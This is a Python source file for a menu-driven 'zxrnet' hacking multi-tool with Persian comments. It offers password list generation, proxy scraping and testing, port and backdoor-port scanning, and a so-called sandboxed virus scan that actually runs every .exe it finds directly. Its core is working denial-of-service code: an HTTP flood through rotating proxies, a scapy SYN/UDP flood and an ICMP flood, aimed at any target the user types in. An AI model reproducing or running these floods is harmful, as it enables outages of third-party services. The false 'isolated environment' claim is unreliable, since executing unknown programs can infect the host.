import requests
import threading
import queue
import random
import string
import socket
import time
import os
import json
import sys
import subprocess
import psutil  # برای تحلیل رفتار فرآیندها
from concurrent.futures import ThreadPoolExecutor
from termcolor import colored
from tqdm import tqdm
import logging
from datetime import datetime
import platform
from prettytable import PrettyTable
import glob

# تلاش برای وارد کردن scapy
try:
    from scapy.all import IP, TCP, UDP, ICMP, send
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print(colored("Scapy not available. Layer 3/4 attacks disabled.", "red"))

# تنظیمات لاگ
logging.basicConfig(filename='ultimate_tool.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')

# دیتابیس پورت-سرویس و بک‌دورها
SERVICE_PORTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 3306: "MySQL",
    3389: "RDP", 8080: "HTTP-Alt"
}

BACKDOOR_PORTS = {
    1234: "Netcat Backdoor", 2000: "Back Orifice", 31337: "Back Orifice 2000",
    4444: "Metasploit Default", 5555: "Android ADB Backdoor", 6666: "Common Trojan",
    7734: "GhostCtrl", 9999: "Generic Backdoor", 54321: "Generic Backdoor"
}

# رفتارهای مشکوک بدافزارها (منبع: الگوهای رایج بدافزار)
SUSPICIOUS_BEHAVIORS = {
    "network": "Attempted network connection",  # اتصال به شبکه
    "high_cpu": "High CPU usage (>80%)",       # مصرف بالای CPU
    "file_mod": "Unauthorized file modification",  # تغییر فایل‌ها
    "registry": "Registry access attempt"      # دسترسی به رجیستری
}

class UltimateTool:
    def __init__(self):
        self.author = "amirzxrtop"
        self.version = "3.6.0"
        self.proxies = []
        self.working_proxies = {"http": [], "socks4": [], "socks5": []}
        self.results_queue = queue.Queue()
        self.backdoor_queue = queue.Queue()
        self.virus_queue = queue.Queue()
        self.proxy_sources = {
            "http": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http",
            "socks4": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4",
            "socks5": "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5"
        }
        self.config_file = "config.json"
        self.load_config()
        self.clear_screen()

    def clear_screen(self):
        """پاک کردن صفحه"""
        os.system('cls' if platform.system() == 'Windows' else 'clear')

    def load_config(self):
        """بارگذاری تنظیمات"""
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    self.config = json.load(f)
            else:
                self.config = {"proxies": [], "settings": {"threads": 50}}
                self.save_config()
        except Exception as e:
            logging.error(f"Config load error: {e}")

    def save_config(self):
        """ذخیره تنظیمات"""
        with open(self.config_file, 'w') as f:
            json.dump(self.config, f, indent=4)

    def banner(self):
        """نمایش بنر زیبا"""
        print(colored(f"""
        ===================================================
                         IN THE NAME OF GOD
            zxrnet tool {self.version} by https://t.me/{self.author} 
        ===================================================
        """, "cyan"))

    def validate_ip(self, ip):
        """اعتبارسنجی آدرس IP"""
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def validate_port_range(self, port_range_input):
        """اعتبارسنجی محدوده پورت‌ها"""
        try:
            start, end = map(int, port_range_input.split("-"))
            if 1 <= start <= 65535 and 1 <= end <= 65535 and start <= end:
                return (start, end)
            else:
                raise ValueError("Ports must be between 1 and 65535, and start <= end")
        except ValueError:
            raise ValueError("Invalid port range format. Use 'start-end' (e.g., 1-1000)")

    # اسکن ویروس
    def scan_virus(self):
        """اسکن ویروس در یک برنامه یا کل سیستم"""
        self.banner()
        choice = input(colored("Scan a single program (1) or entire system (2)? [1/2]: ", "yellow"))
        
        if choice == "1":
            file_path = input(colored("Enter the full path of the .exe file (e.g., C:\\example.exe): ", "yellow"))
            if not file_path.endswith(".exe") or not os.path.isfile(file_path):
                print(colored("Error: Invalid .exe file path.", "red"))
                return
            self.analyze_file(file_path)
        elif choice == "2":
            print(colored("Scanning entire system for .exe files...", "yellow"))
            exe_files = self.collect_exe_files()
            if not exe_files:
                print(colored("No .exe files found in the system.", "yellow"))
                return
            print(colored(f"Found {len(exe_files)} .exe files. Analyzing...", "cyan"))
            for file_path in tqdm(exe_files, desc="Analyzing Files", colour="green"):
                self.analyze_file(file_path)
        else:
            print(colored("Invalid choice.", "red"))
            return

        self.display_virus_results()

    def collect_exe_files(self):
        """جمع‌آوری تمام فایل‌های .exe در سیستم"""
        exe_files = []
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        for drive in drives:
            for root, _, files in os.walk(drive):
                for file in files:
                    if file.endswith(".exe"):
                        exe_files.append(os.path.join(root, file))
        return exe_files[:50]  # محدود کردن به 50 فایل برای تست سریع‌تر

    def analyze_file(self, file_path):
        """تحلیل رفتار فایل در محیط سندباکس"""
        try:
            # اجرای فایل در محیط ایزوله
            process = subprocess.Popen([file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            pid = process.pid
            proc = psutil.Process(pid)
            
            # تحلیل رفتار به مدت 5 ثانیه
            start_time = time.time()
            suspicious = []
            
            while time.time() - start_time < 5:
                # بررسی مصرف CPU
                cpu_usage = proc.cpu_percent(interval=0.1)
                if cpu_usage > 80:
                    suspicious.append(SUSPICIOUS_BEHAVIORS["high_cpu"])
                
                # بررسی اتصالات شبکه
                if proc.connections():
                    suspicious.append(SUSPICIOUS_BEHAVIORS["network"])
                
                # بررسی تغییرات فایل (ساده)
                if os.path.getmtime(file_path) > start_time:
                    suspicious.append(SUSPICIOUS_BEHAVIORS["file_mod"])
                
                time.sleep(0.1)
            
            # خاتمه دادن به فرآیند
            process.terminate()
            try:
                process.wait(timeout=2)
            except subprocess.TimeoutExpired:
                process.kill()

            if suspicious:
                self.virus_queue.put((file_path, "Suspicious", ", ".join(set(suspicious))))
            else:
                self.virus_queue.put((file_path, "Safe", "No suspicious behavior"))

        except Exception as e:
            self.virus_queue.put((file_path, "Error", f"Failed to analyze: {e}"))

    def display_virus_results(self):
        """نمایش نتایج اسکن ویروس"""
        table = PrettyTable(["File Path", "Status", "Details"])
        suspicious_count = 0
        
        while not self.virus_queue.empty():
            file_path, status, details = self.virus_queue.get()
            color = "green" if status == "Safe" else "red" if status == "Suspicious" else "yellow"
            table.add_row([file_path, colored(status, color), details])
            if status == "Suspicious":
                suspicious_count += 1
        
        if suspicious_count > 0:
            print(colored(f"WARNING: {suspicious_count} suspicious files detected!", "red"))
            print(table)
        else:
            print(colored("No suspicious files detected.", "green"))
        self.generate_report(f"Scanned for viruses. Found {suspicious_count} suspicious files")

    # اسکن پورت‌ها (بدون تغییر، برای کوتاه‌تر شدن کد حذف شده)
    def scan_port(self, target, port, protocol="tcp"):
        if protocol == "tcp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            service = SERVICE_PORTS.get(port, "Unknown")
            banner = self.grab_banner(target, port, protocol)
            if banner or service != "Unknown":
                self.results_queue.put((port, protocol.upper(), "open", service, banner or "No banner"))
            else:
                self.results_queue.put((port, protocol.upper(), "closed", service, "No response"))
        else:
            self.results_queue.put((port, protocol.upper(), "closed", service, "No response"))
        sock.close()

    def grab_banner(self, target, port, protocol):
        try:
            if protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, port))
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
                sock.close()
                return banner if banner else None
            elif protocol == "udp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(b"WHO", (target, port))
                banner, _ = sock.recvfrom(1024)
                sock.close()
                return banner.decode('utf-8', errors='ignore').strip() if banner else None
        except:
            return None

    def scan_ports(self, target, port_range=(1, 65535), threads=100):
        self.banner()
        print(colored(f"Scanning ports on {target} ({port_range[0]}-{port_range[1]}) with TCP and UDP...", "yellow"))
        table = PrettyTable(["Port", "Protocol", "Status", "Service", "Banner"])
        total_ports = (port_range[1] - port_range[0] + 1) * 2
        with tqdm(total=total_ports, desc="Scanning Ports", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in range(*port_range):
                    executor.submit(self.scan_port, target, port, "tcp")
                    executor.submit(self.scan_port, target, port, "udp")
                    pbar.update(2)
        open_ports = 0
        while not self.results_queue.empty():
            port, protocol, status, service, banner = self.results_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green"), service, banner[:50] + "..." if banner and len(banner) > 50 else banner])
                open_ports += 1
        if open_ports > 0:
            print(table)
        else:
            print(colored("No open ports with identifiable services or banners found.", "yellow"))
        self.generate_report(f"Scanned ports on {target}. Found {open_ports} open ports")

    # اسکن بک‌دورها (بدون تغییر، برای کوتاه‌تر شدن کد حذف شده)
    def scan_backdoors(self, target, threads=50):
        self.banner()
        print(colored(f"Scanning for known backdoors on {target}...", "yellow"))
        table = PrettyTable(["Port", "Protocol", "Status", "Backdoor Name", "Banner"])
        total_ports = len(BACKDOOR_PORTS) * 2
        with tqdm(total=total_ports, desc="Scanning Backdoors", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for port in BACKDOOR_PORTS.keys():
                    executor.submit(self.scan_port_for_backdoor, target, port, "tcp")
                    executor.submit(self.scan_port_for_backdoor, target, port, "udp")
                    pbar.update(2)
        open_backdoors = 0
        while not self.backdoor_queue.empty():
            port, protocol, status, backdoor_name, banner = self.backdoor_queue.get()
            if status == "open":
                table.add_row([port, protocol, colored(status, "green"), backdoor_name, banner[:50] + "..." if banner and len(banner) > 50 else banner])
                open_backdoors += 1
        if open_backdoors > 0:
            print(colored("WARNING: Potential backdoors detected!", "red"))
            print(table)
        else:
            print(colored("No known backdoors detected.", "green"))
        self.generate_report(f"Scanned for backdoors on {target}. Found {open_backdoors} potential backdoors")

    def scan_port_for_backdoor(self, target, port, protocol):
        if protocol == "tcp":
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            banner = self.grab_banner(target, port, protocol)
            backdoor_name = BACKDOOR_PORTS.get(port, "Unknown Backdoor")
            self.backdoor_queue.put((port, protocol.upper(), "open", backdoor_name, banner or "No banner"))
        sock.close()

    # سایر توابع بدون تغییر (حذف شده برای کوتاه‌تر شدن)
    def generate_password_list(self, length=12, count=5000, custom_words=None, filename="passwords.txt"):
        self.banner()
        print(colored(f"Generating {count} passwords of length {length}...", "yellow"))
        passwords = set()
        characters = string.ascii_letters + string.digits + string.punctuation
        custom_words = custom_words.split() if custom_words else []
        with tqdm(total=count, desc="Generating Passwords", colour="green") as pbar:
            while len(passwords) < count:
                if custom_words and random.random() > 0.5:
                    base = random.choice(custom_words)
                    pwd = base + ''.join(random.choice(characters) for _ in range(length - len(base)))
                else:
                    pwd = ''.join(random.choice(characters) for _ in range(length))
                passwords.add(pwd)
                pbar.update(1)
        with open(filename, 'w') as f:
            f.write("\n".join(passwords))
        print(colored(f"Password list saved to {filename}", "green"))
        self.generate_report(f"Generated {count} passwords and saved to {filename}")

    def fetch_proxies(self, proxy_type="all"):
        self.banner()
        print(colored(f"Fetching {proxy_type} proxies...", "yellow"))
        sources = self.proxy_sources if proxy_type == "all" else {proxy_type: self.proxy_sources[proxy_type]}
        for ptype, url in sources.items():
            try:
                response = requests.get(url, timeout=10)
                if response.status_code == 200:
                    proxies = response.text.splitlines()
                    self.proxies.extend(proxies)
                    print(colored(f"Collected {len(proxies)} {ptype} proxies", "cyan"))
            except Exception as e:
                logging.error(f"Failed to fetch {ptype} proxies: {e}")
        print(colored(f"Total proxies collected: {len(self.proxies)}", "green"))
        self.generate_report(f"Collected {len(self.proxies)} proxies")

    def test_proxy(self, proxy, proxy_type):
        proxy_dict = {proxy_type: f"{proxy_type}://{proxy}"}
        start_time = time.time()
        try:
            response = requests.get("http://www.google.com", proxies=proxy_dict, timeout=5)
            if response.status_code == 200:
                latency = (time.time() - start_time) * 1000
                self.working_proxies[proxy_type].append((proxy, latency))
                return True
        except:
            return False

    def test_all_proxies(self, threads=50):
        self.banner()
        print(colored(f"Testing {len(self.proxies)} proxies with {threads} threads...", "yellow"))
        proxy_types = ["http", "socks4", "socks5"]
        with tqdm(total=len(self.proxies), desc="Testing Proxies", colour="green") as pbar:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for proxy in self.proxies:
                    for ptype in proxy_types:
                        if self.test_proxy(proxy, ptype):
                            pbar.update(1)
                            break
                    pbar.update(1)
        table = PrettyTable(["Proxy", "Type", "Latency (ms)"])
        for ptype, proxies in self.working_proxies.items():
            for proxy, latency in proxies:
                table.add_row([proxy, ptype, f"{latency:.2f}"])
            print(colored(f"Found {len(proxies)} working {ptype} proxies", "green"))
            with open(f"working_{ptype}_proxies.txt", "w") as f:
                f.write("\n".join([p[0] for p in proxies]))
        print(table)
        self.generate_report(f"Tested proxies. Found {sum(len(p) for p in self.working_proxies.values())} working proxies")

    def layer7_stress(self, target, duration=60, threads=200, use_proxies=True):
        self.banner()
        print(colored(f"Starting Layer 7 attack on {target} for {duration} seconds...", "red"))
        end_time = time.time() + duration
        def flood():
            headers = {"User-Agent": random.choice(["Mozilla/5.0", "Chrome/90.0", "Safari/537.36"])}
            while time.time() < end_time:
                try:
                    proxy = random.choice([p[0] for p in self.working_proxies["http"]]) if use_proxies and self.working_proxies["http"] else None
                    proxies = {"http": f"http://{proxy}"} if proxy else None
                    requests.get(target, headers=headers, proxies=proxies, timeout=5)
                except:
                    pass
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))
        print(colored("Layer 7 attack completed", "green"))
        self.generate_report(f"Layer 7 attack on {target} for {duration}s")

    def layer4_stress(self, target, port, duration=60, threads=100, protocol="tcp"):
        if not SCAPY_AVAILABLE:
            print(colored("Layer 4 attack requires scapy and root access. Skipping...", "red"))
            return
        self.banner()
        print(colored(f"Starting Layer 4 {protocol.upper()} attack on {target}:{port}...", "red"))
        end_time = time.time() + duration
        def flood():
            while time.time() < end_time:
                try:
                    if protocol == "tcp":
                        pkt = IP(dst=target)/TCP(dport=port, flags="S")
                    else:
                        pkt = IP(dst=target)/UDP(dport=port)
                    send(pkt, verbose=False)
                except:
                    pass
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))
        print(colored(f"Layer 4 {protocol.upper()} attack completed", "green"))
        self.generate_report(f"Layer 4 {protocol} attack on {target}:{port}")

    def layer3_stress(self, target, duration=60, threads=100):
        if not SCAPY_AVAILABLE:
            print(colored("Layer 3 attack requires scapy and root access. Skipping...", "red"))
            return
        self.banner()
        print(colored(f"Starting Layer 3 attack on {target}...", "red"))
        end_time = time.time() + duration
        def flood():
            while time.time() < end_time:
                try:
                    pkt = IP(dst=target)/ICMP()
                    send(pkt, verbose=False)
                except:
                    pass
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda _: flood(), range(threads))
        print(colored("Layer 3 attack completed", "green"))
        self.generate_report(f"Layer 3 attack on {target}")

    def generate_report(self, message):
        with open("report.txt", "a") as f:
            f.write(f"[{datetime.now()}] {message}\n")
        logging.info(message)

    def run(self):
        while True:
            self.banner()
            options = [
                "1. Generate Password List", "2. Fetch Proxies", "3. Test Proxies",
                "4. Scan Ports", "5. Scan Backdoors", "6. Scan Virus",
                "7. Layer 7 Stress", "8. Layer 4 Stress", "9. Layer 3 Stress", "10. Exit"
            ]
            print("\n".join(colored(opt, "cyan") for opt in options))
            choice = input(colored("Select an option: ", "yellow"))

            try:
                if choice == "1":
                    length = int(input("Password length (e.g., 12): "))
                    count = int(input("Number of passwords (e.g., 5000): "))
                    custom_words = input("Custom words (optional, space-separated): ") or None
                    self.generate_password_list(length, count, custom_words)
                elif choice == "2":
                    proxy_type = input("Proxy type (http/socks4/socks5/all): ").lower()
                    if proxy_type not in ["http", "socks4", "socks5", "all"]:
                        raise ValueError("Invalid proxy type")
                    self.fetch_proxies(proxy_type)
                elif choice == "3":
                    threads = int(input(f"Number of threads (default {self.config['settings']['threads']}): ") or self.config["settings"]["threads"])
                    self.test_all_proxies(threads)
                elif choice == "4":
                    while True:
                        target = input("Target IP (e.g., 192.168.1.1): ")
                        if self.validate_ip(target):
                            break
                        print(colored("Invalid IP address. Try again.", "red"))
                    while True:
                        try:
                            port_range_input = input("Port range (start-end, e.g., 1-1000): ") or "1-1000"
                            port_range = self.validate_port_range(port_range_input)
                            break
                        except ValueError as e:
                            print(colored(f"Error: {e}", "red"))
                    threads = int(input(f"Number of threads (default {self.config['settings']['threads']}): ") or self.config["settings"]["threads"])
                    self.scan_ports(target, port_range, threads)
                elif choice == "5":
                    while True:
                        target = input("Target IP (e.g., 192.168.1.1): ")
                        if self.validate_ip(target):
                            break
                        print(colored("Invalid IP address. Try again.", "red"))
                    threads = int(input(f"Number of threads (default {self.config['settings']['threads']}): ") or self.config["settings"]["threads"])
                    self.scan_backdoors(target, threads)
                elif choice == "6":
                    self.scan_virus()
                elif choice == "7":
                    target = input("Target URL (e.g., http://example.com): ")
                    duration = int(input("Duration (seconds, e.g., 60): "))
                    threads = int(input("Number of threads (default 200): ") or 200)
                    use_proxies = input("Use proxies? (y/n, default y): ").lower() in ["", "y"]
                    self.layer7_stress(target, duration, threads, use_proxies)
                elif choice == "8":
                    while True:
                        target = input("Target IP (e.g., 192.168.1.1): ")
                        if self.validate_ip(target):
                            break
                        print(colored("Invalid IP address. Try again.", "red"))
                    port = int(input("Target Port (1-65535): "))
                    protocol = input("Protocol (tcp/udp): ").lower()
                    if protocol not in ["tcp", "udp"]:
                        raise ValueError("Invalid protocol")
                    duration = int(input("Duration (seconds, e.g., 60): "))
                    threads = int(input("Number of threads (default 100): ") or 100)
                    self.layer4_stress(target, port, duration, threads, protocol)
                elif choice == "9":
                    while True:
                        target = input("Target IP (e.g., 192.168.1.1): ")
                        if self.validate_ip(target):
                            break
                        print(colored("Invalid IP address. Try again.", "red"))
                    duration = int(input("Duration (seconds, e.g., 60): "))
                    threads = int(input("Number of threads (default 100): ") or 100)
                    self.layer3_stress(target, duration, threads)
                elif choice == "10":
                    print(colored("Exiting tool. Goodbye!", "green"))
                    sys.exit(0)
                else:
                    print(colored("Invalid option. Please try again.", "red"))
            except ValueError as e:
                print(colored(f"Error: {e}", "red"))
            except Exception as e:
                print(colored(f"Unexpected error: {e}", "red"))
                logging.error(f"Error in option {choice}: {e}")

            input(colored("Press Enter to continue...", "yellow"))
            self.clear_screen()

if __name__ == "__main__":
    tool = UltimateTool()
    tool.run()